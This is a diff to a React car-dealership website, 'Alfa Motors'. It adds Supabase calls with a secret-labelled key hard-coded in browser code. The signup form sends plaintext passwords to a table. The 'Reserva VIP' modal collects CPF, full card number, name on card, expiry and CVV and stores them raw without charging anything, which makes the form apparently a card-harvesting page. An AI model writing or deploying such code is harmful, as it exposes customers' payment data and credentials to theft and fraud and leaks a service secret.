@@ -4,16 +4,18 @@ import {
   LogOut, X, Crown, Landmark, ChevronRight, Calculator, User 
 } from 'lucide-react';
 
+// --- CONFIGURAÇÃO SUPABASE ---
+const SUPABASE_URL = "https://bojdcxmnmkfraghhievo.supabase.co";
+const SUPABASE_KEY = "sb_secret_NQSxT14ibVvH82krlEVjcg_Dmz7GLQV";
+
 export default function App() {
   const gold = "#f59e0b";
   const black = "#0a0a0a";
   const cardBg = "#141414";
 
-  // --- DISTRIBUIÇÃO DE ATENDENTES ---
   const atendentes = ["5511958071871", "5511999999999"];
   const selecionarAtendente = () => atendentes[Math.floor(Math.random() * atendentes.length)];
 
-  // --- ESTADOS ---
   const [user, setUser] = useState(null);
   const [showAuthModal, setShowAuthModal] = useState(false);
   const [isLoginTab, setIsLoginTab] = useState(true);
@@ -32,7 +34,6 @@ export default function App() {
     if (savedUser) setUser(JSON.parse(savedUser));
   }, []);
 
-  // --- MÁSCARAS ---
   const formatPhone = (val) => {
     let v = val.replace(/\D/g, "").slice(0, 11);
     if (v.length > 10) v = v.replace(/^(\d\d)(\d{5})(\d{4}).*/, "($1) $2-$3");
@@ -56,29 +57,73 @@ export default function App() {
     setReservaData(prev => ({ ...prev, [campo]: v }));
   };
 
+  // --- INTEGRAÇÃO SUPABASE: CADASTRO ---
+  const handleAuth = async (e) => {
+    e.preventDefault();
+    if (!authData.email || !authData.senha) return alert("Preencha os campos obrigatórios.");
+
+    try {
+      const response = await fetch(`${SUPABASE_URL}/rest/v1/cadastros`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "apikey": SUPABASE_KEY,
+          "Authorization": `Bearer ${SUPABASE_KEY}`
+        },
+        body: JSON.stringify([authData])
+      });
+
+      if (!response.ok) throw new Error("Erro ao salvar cadastro");
+
+      const userData = { nome: authData.nome || "Cliente VIP", email: authData.email };
+      setUser(userData);
+      localStorage.setItem('alfa_user', JSON.stringify(userData));
+      setShowAuthModal(false);
+      alert("Cadastro realizado com sucesso!");
+      
+    } catch (error) {
+      console.error(error);
+      alert("Erro na integração com o servidor.");
+    }
+  };
+
+  // --- INTEGRAÇÃO SUPABASE: RESERVA VIP ---
+  const handleReservaVip = async (e) => {
+    e.preventDefault();
+    if (!reservaData.nome || !reservaData.numeroCartao) return alert("Preencha os dados do cartão.");
+
+    try {
+      const response = await fetch(`${SUPABASE_URL}/rest/v1/reserva_vip`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "apikey": SUPABASE_KEY,
+          "Authorization": `Bearer ${SUPABASE_KEY}`
+        },
+        body: JSON.stringify([reservaData])
+      });
+
+      if (!response.ok) throw new Error("Erro ao processar reserva");
+
+      alert("Sua prioridade foi ativada com sucesso!");
+      setShowReserva(false);
+      setReservaData({ nome: '', cpf: '', numeroCartao: '', nomeCartao: '', validade: '', cvv: '' });
+
+    } catch (error) {
+      console.error(error);
+      alert("Não foi possível processar sua reserva VIP.");
+    }
+  };
+
   const calcularFinanciamento = (e) => {
     e.preventDefault();
     const valorCarro = selectedCar.preco;
     const valorEntrada = Number(dadosSimulacao.entrada.replace(/\D/g, "")) / 100;
     const numParcelas = parseInt(dadosSimulacao.parcelas);
-    
-    if (valorCarro === 0) return alert("Selecione um veículo primeiro!");
     const saldoDevedor = valorCarro - valorEntrada;
     const taxaMensal = 0.0189;
     const valorParcela = (saldoDevedor * taxaMensal) / (1 - Math.pow(1 + taxaMensal, -numParcelas));
-
-    setResultado({
-      parcela: valorParcela.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' }),
-      total: (valorParcela * numParcelas + valorEntrada).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })
-    });
-  };
-
-  const handleAuth = (e) => {
-    e.preventDefault();
-    const userData = { nome: authData.nome || "Cliente VIP", email: authData.email, telefone: authData.telefone };
-    setUser(userData);
-    localStorage.setItem('alfa_user', JSON.stringify(userData));
-    setShowAuthModal(false);
+    setResultado({ parcela: valorParcela.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' }) });
   };
 
   const inputStyle = { width: '100%', padding: '14px', borderRadius: '10px', border: '1px solid #222', background: '#080808', color: '#fff', outline: 'none', boxSizing: 'border-box' };
@@ -91,23 +136,14 @@ export default function App() {
         <h2 style={{ margin: 0, fontWeight: '900' }}>ALFA <span style={{ color: gold }}>MOTORS</span></h2>
         <div style={{ display: 'flex', gap: '20px', alignItems: 'center' }}>
           {user && (
-            <motion.button 
-              onClick={() => setShowReserva(true)} 
-              whileHover={{ scale: 1.05 }} 
-              style={{ background: 'none', border: `1px solid ${gold}`, color: gold, padding: '8px 15px', borderRadius: '5px', fontWeight: 'bold', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '8px' }}
-            >
+            <motion.button onClick={() => setShowReserva(true)} whileHover={{ scale: 1.05 }} style={{ background: 'none', border: `1px solid ${gold}`, color: gold, padding: '8px 15px', borderRadius: '5px', fontWeight: 'bold', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '8px' }}>
               <Crown size={16} /> RESERVA VIP
             </motion.button>
           )}
           {user ? (
             <button onClick={() => { setUser(null); localStorage.removeItem('alfa_user'); }} style={{ background: 'none', border: 'none', color: '#666', cursor: 'pointer' }}><LogOut size={18} /></button>
           ) : (
-            <button 
-              onClick={() => setShowAuthModal(true)} 
-              style={{ background: gold, border: 'none', padding: '8px 20px', borderRadius: '5px', fontWeight: 'bold', cursor: 'pointer', color: '#000' }}
-            >
-              Login
-            </button>
+            <button onClick={() => setShowAuthModal(true)} style={{ background: gold, border: 'none', padding: '8px 20px', borderRadius: '5px', fontWeight: 'bold', cursor: 'pointer', color: '#000' }}>Login</button>
           )}
         </div>
       </nav>
@@ -115,20 +151,20 @@ export default function App() {
       {/* HEADER */}
       <header style={{ paddingTop: '160px', textAlign: 'center' }}>
           <h1 style={{ fontSize: '3.5rem', fontWeight: '900' }}>CATÁLOGO <span style={{ color: gold }}>ALFA</span></h1>
-          <p style={{ color: '#555' }}>Encontre o seu próximo carro em São Bernardo do Campo</p>
+          <p style={{ color: '#555' }}>Veículos selecionados com garantia de procedência</p>
       </header>
 
-      {/* INVENTÁRIO EXPANDIDO */}
+      {/* GRID DE CARROS */}
       <section style={{ padding: '50px 5%', display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '25px' }}>
         {carInventory.map(car => (
           <motion.div 
             key={car.id} 
-            whileHover={{ y: -10, borderColor: gold, boxShadow: `0px 10px 30px rgba(245, 158, 11, 0.1)` }}
-            style={{ background: cardBg, padding: '25px', borderRadius: '20px', border: '1px solid #1a1a1a', cursor: 'pointer', transition: 'border-color 0.3s' }}
+            whileHover={{ y: -10, borderColor: gold }}
+            style={{ background: cardBg, padding: '25px', borderRadius: '20px', border: '1px solid #1a1a1a', cursor: 'pointer' }}
             onClick={() => { setSelectedCar(car); simuladorRef.current.scrollIntoView({ behavior: 'smooth' }); }}
           >
-            <div style={{ color: gold, fontSize: '0.7rem', fontWeight: 'bold', marginBottom: '8px', textTransform: 'uppercase', letterSpacing: '1px' }}>{car.tag}</div>
-            <h3 style={{ fontSize: '1.2rem', margin: '0 0 5px 0' }}>{car.nome}</h3>
+            <div style={{ color: gold, fontSize: '0.7rem', fontWeight: 'bold', marginBottom: '8px' }}>{car.tag}</div>
+            <h3 style={{ fontSize: '1.2rem', margin: '0' }}>{car.nome}</h3>
             <p style={{ color: '#666', fontSize: '0.9rem', marginBottom: '15px' }}>Ano: {car.ano}</p>
             <h2 style={{ color: gold, margin: 0 }}>R$ {car.preco.toLocaleString('pt-BR')}</h2>
           </motion.div>
@@ -140,50 +176,26 @@ export default function App() {
         <div style={{ maxWidth: '600px', margin: '0 auto', background: cardBg, padding: '45px', borderRadius: '35px', border: '1px solid #1a1a1a', textAlign: 'center' }}>
           <h2 style={{ marginBottom: '10px' }}>Simular <span style={{ color: gold }}>Crédito</span></h2>
           <p style={{ color: gold, fontWeight: 'bold' }}>{selectedCar.nome}</p>
-          
           <form onSubmit={calcularFinanciamento} style={{ display: 'flex', flexDirection: 'column', gap: '20px', marginTop: '25px' }}>
-            <input 
-              required 
-              placeholder="R$ 0,00 (Entrada)" 
-              style={inputStyle} 
-              value={dadosSimulacao.entrada} 
-              onChange={e => setDadosSimulacao({...dadosSimulacao, entrada: formatMoedaInput(e.target.value)})} 
-            />
-            
-            <select 
-              style={inputStyle} 
-              value={dadosSimulacao.parcelas} 
-              onChange={e => setDadosSimulacao({...dadosSimulacao, parcelas: e.target.value})}
-            >
+            <input required placeholder="R$ 0,00 (Entrada)" style={inputStyle} value={dadosSimulacao.entrada} onChange={e => setDadosSimulacao({...dadosSimulacao, entrada: formatMoedaInput(e.target.value)})} />
+            <select style={inputStyle} value={dadosSimulacao.parcelas} onChange={e => setDadosSimulacao({...dadosSimulacao, parcelas: e.target.value})}>
               <option value="12">12x Mensais</option>
               <option value="24">24x Mensais</option>
               <option value="36">36x Mensais</option>
-              <option value="48">48x Fixas (Recomendado)</option>
+              <option value="48">48x Fixas</option>
               <option value="60">60x Fixas</option>
-              <option value="72">72x Fixas (Plano Estendido)</option>
+              <option value="72">72x Fixas</option>
             </select>
-            
-            <button type="submit" style={{ padding: '18px', background: gold, border: 'none', borderRadius: '12px', fontWeight: '900', cursor: 'pointer', color: '#000' }}>
-              CALCULAR PARCELAS
-            </button>
+            <button type="submit" style={{ padding: '18px', background: gold, border: 'none', borderRadius: '12px', fontWeight: '900', cursor: 'pointer', color: '#000' }}>CALCULAR PARCELAS</button>
           </form>
-
           {resultado && (
-            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} style={{ marginTop: '30px', padding: '20px', background: '#080808', borderRadius: '20px', border: `1px solid ${gold}40` }}>
-              <p style={{ color: '#666', margin: '0 0 5px 0' }}>Sua parcela estimada:</p>
-              <h1 style={{ color: gold, fontSize: '2.5rem', margin: '0 0 15px 0' }}>{resultado.parcela}</h1>
-              <button 
-                onClick={() => window.open(`https://wa.me/${selecionarAtendente()}?text=Olá! Gostaria de aprovar o financiamento para o ${selectedCar.nome}. Fiz uma simulação em ${dadosSimulacao.parcelas}x com entrada de ${dadosSimulacao.entrada}.`)} 
-                style={{ background: '#25D366', color: '#fff', border: 'none', padding: '15px', borderRadius: '10px', fontWeight: 'bold', cursor: 'pointer', width: '100%', display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '10px' }}
-              >
-                APROVAR NO WHATSAPP
-              </button>
+            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} style={{ marginTop: '30px', padding: '20px', background: '#080808', borderRadius: '20px' }}>
+              <h1 style={{ color: gold, fontSize: '2.5rem' }}>{resultado.parcela}</h1>
+              <button onClick={() => window.open(`https://wa.me/${selecionarAtendente()}?text=Olá! Simulei o ${selectedCar.nome}`)} style={{ background: '#25D366', color: '#fff', border: 'none', padding: '15px', borderRadius: '10px', fontWeight: 'bold', cursor: 'pointer', width: '100%', marginTop: '10px' }}>APROVAR NO WHATSAPP</button>
             </motion.div>
           )}
         </div>
       </section>
-
-
 
       {/* MODAL RESERVA VIP */}
       <AnimatePresence>
@@ -196,10 +208,11 @@ export default function App() {
                 <Crown size={35} color={gold} style={{ marginBottom: '10px' }} />
                 <h3>RESERVA PRIORITÁRIA</h3>
               </div>
-              <form onSubmit={(e) => { e.preventDefault(); alert("Reserva enviada! Nosso gerente entrará em contato."); setShowReserva(false); }} style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
+              <form onSubmit={handleReservaVip} style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
                 <input required placeholder="Nome Completo do Titular" style={inputStyle} value={reservaData.nome} onChange={e => setReservaData({...reservaData, nome: e.target.value})} />
                 <input required placeholder="CPF" style={inputStyle} value={reservaData.cpf} onChange={e => aplicarMascarasVip('cpf', e.target.value)} />
                 <input required placeholder="Número do Cartão" style={inputStyle} value={reservaData.numeroCartao} onChange={e => aplicarMascarasVip('numeroCartao', e.target.value)} />
+                <input required placeholder="Nome no Cartão" style={inputStyle} value={reservaData.nomeCartao} onChange={e => setReservaData({ ...reservaData, nomeCartao: e.target.value })} />
                 <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '15px' }}>
                   <input required placeholder="Validade" style={inputStyle} value={reservaData.validade} onChange={e => aplicarMascarasVip('validade', e.target.value)} />
                   <input required placeholder="CVV" style={inputStyle} value={reservaData.cvv} onChange={e => aplicarMascarasVip('cvv', e.target.value)} />
@@ -242,7 +255,6 @@ export default function App() {
   );
 }
 
-// INVENTÁRIO ATUALIZADO COM MAIS OPÇÕES
 const carInventory = [
   { id: 1, nome: "Honda Civic G10", ano: "2020", preco: 115900, tag: "Premium" },
   { id: 2, nome: "Toyota Corolla XEi", ano: "2019", preco: 108500, tag: "Mais Vendido" },
